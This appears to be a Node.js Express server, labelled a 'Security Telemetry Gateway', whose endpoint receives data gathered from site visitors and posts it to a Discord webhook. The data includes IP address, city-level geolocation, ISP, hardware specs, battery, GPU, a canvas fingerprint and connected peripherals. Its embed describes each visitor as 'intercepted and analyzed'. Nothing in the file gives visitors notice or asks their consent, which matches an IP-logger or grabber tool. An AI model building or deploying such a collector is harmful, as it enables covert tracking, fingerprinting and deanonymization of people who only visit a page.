const express = require('express');
const path = require('path');

const app = express();

const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// ─────────────────────────────────────────────
// Middleware
// ─────────────────────────────────────────────

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));


// ─────────────────────────────────────────────
// Utility Functions
// ─────────────────────────────────────────────

function getClientIP(req) {
    return (
        req.headers['x-forwarded-for']?.split(',')[0].trim() ||
        req.socket.remoteAddress ||
        'Unknown'
    );
}

async function getGeoData(ip) {
    const unknown = {
        country: 'Unknown',
        regionName: 'Unknown',
        city: 'Unknown',
        isp: 'Unknown',
        org: 'Unknown',
        hosting: false
    };

    if (
        ip === 'Unknown' ||
        ip === '127.0.0.1' ||
        ip === '::1'
    ) {
        return unknown;
    }

    try {
        const response = await fetch(
            `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,hosting,query`
        );

        const data = await response.json();

        if (data.status === 'success') {
            return data;
        }

        return unknown;
    } catch (error) {
        console.error('GeoIP lookup failed:', error);
        return unknown;
    }
}

function formatNetwork(network = {}) {
    return {
        type: network.effectiveType
            ? network.effectiveType.toUpperCase()
            : '4G',

        downlink: network.downlink
            ? `${network.downlink} Mbps`
            : 'Unknown',

        rtt: network.rtt
            ? `${network.rtt} ms`
            : 'Unknown'
    };
}


// ─────────────────────────────────────────────
// Discord Report
// ─────────────────────────────────────────────

function createDiscordPayload(telemetry, ip, geo, network) {
    const location = [
        geo.city,
        geo.regionName,
        geo.country
    ].join(', ');

    const peripherals =
        telemetry.peripherals?.length > 0
            ? telemetry.peripherals.join('\n')
            : 'No public devices exposed';

    return {
        embeds: [
            {
                title: '🛡️ Security Telemetry Report',

                description:
                    'A new visitor connection was intercepted and analyzed.',

                color: geo.hosting
                    ? 0xef4444
                    : 0x3b82f6,

                fields: [

                    // ───────────────────────
                    // Network
                    // ───────────────────────

                    {
                        name: '🌐 Network',
                        value: [
                            `**IP Address**\n\`${ip}\``,

                            `**Location**\n\`${location}\``,

                            `**ISP**\n\`${geo.isp}\``,

                            `**Organization**\n\`${geo.org}\``,

                            `**Hosting / Proxy**\n${
                                geo.hosting
                                    ? '🚨 **Yes — Hosting/Proxy detected**'
                                    : '✅ No'
                            }`
                        ].join('\n\n'),
                        inline: false
                    },

                    // ───────────────────────
                    // Connection
                    // ───────────────────────

                    {
                        name: '📡 Connection',
                        value: [
                            `**Type:** \`${network.type}\``,
                            `**Downlink:** \`${network.downlink}\``,
                            `**RTT:** \`${network.rtt}\``
                        ].join('\n'),
                        inline: true
                    },

                    // ───────────────────────
                    // Hardware
                    // ───────────────────────

                    {
                        name: '💻 Hardware',
                        value: [
                            `**CPU Cores:** \`${telemetry.cpuCores}\``,
                            `**RAM:** \`${telemetry.deviceMemory}\``,
                            `**Touch Points:** \`${telemetry.maxTouchPoints}\``,
                            `**Battery:** \`${telemetry.battery}\``
                        ].join('\n'),
                        inline: true
                    },

                    // ───────────────────────
                    // Display
                    // ───────────────────────

                    {
                        name: '🖥️ Display',
                        value: [
                            `**Resolution:** \`${telemetry.screen}\``,
                            `**Color Depth:** \`${telemetry.colorDepth}-bit\``,
                            `**Pixel Ratio:** \`${telemetry.pixelRatio}x\``
                        ].join('\n'),
                        inline: true
                    },

                    // ───────────────────────
                    // Browser
                    // ───────────────────────

                    {
                        name: '🤖 Browser / Automation',
                        value: [
                            `**WebDriver:** ${
                                telemetry.webdriver
                                    ? '🚨 True'
                                    : '✅ False'
                            }`
                        ].join('\n'),
                        inline: true
                    },

                    // ───────────────────────
                    // Fingerprint
                    // ───────────────────────

                    {
                        name: '🔍 Fingerprint',
                        value: [
                            `**GPU Renderer**\n\`${telemetry.gpu}\``,

                            `**Canvas Signature**\n\`${telemetry.canvasSignature}\``
                        ].join('\n\n'),
                        inline: false
                    },

                    // ───────────────────────
                    // Peripherals
                    // ───────────────────────

                    {
                        name: '🔌 Connected Peripherals',
                        value: `\`\`\`\n${peripherals}\n\`\`\``,
                        inline: false
                    }
                ],

                footer: {
                    text: 'Security Telemetry Gateway • Real-time Inspection'
                },

                timestamp: new Date().toISOString()
            }
        ]
    };
}


// ─────────────────────────────────────────────
// Telemetry Endpoint
// ─────────────────────────────────────────────

app.post('/api/security-telemetry', async (req, res) => {
    try {
        if (!WEBHOOK_URL) {
            console.error('DISCORD_WEBHOOK_URL is not set!');

            return res.status(500).json({
                error: 'Webhook configuration missing'
            });
        }

        const telemetry = req.body;

        const clientIp = getClientIP(req);

        const geoData = await getGeoData(clientIp);

        const network = formatNetwork(
            telemetry.network
        );

        const discordPayload = createDiscordPayload(
            telemetry,
            clientIp,
            geoData,
            network
        );

        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',

            headers: {
                'Content-Type': 'application/json'
            },

            body: JSON.stringify(discordPayload)
        });

        if (!response.ok) {
            throw new Error(
                `Discord API responded with status ${response.status}`
            );
        }

        res.status(200).json({
            success: true
        });

    } catch (error) {
        console.error(
            'Error forwarding telemetry:',
            error
        );

        res.status(500).json({
            error: 'Failed to process telemetry'
        });
    }
});


// ─────────────────────────────────────────────
// Start Server
// ─────────────────────────────────────────────

app.listen(PORT, '0.0.0.0', () => {
    console.log(
        `Security Dashboard server running on port ${PORT}`
    );
});